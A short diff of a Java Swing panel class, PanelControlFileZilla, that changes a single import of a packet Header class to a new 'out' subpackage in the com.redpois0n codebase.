@@ -15,7 +15,7 @@ import javax.swing.ScrollPaneConstants;
 import javax.swing.table.DefaultTableModel;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.Header;
+import com.redpois0n.packets.out.Header;
 
 @SuppressWarnings("serial")
 public class PanelControlFileZilla extends PanelControlParent {
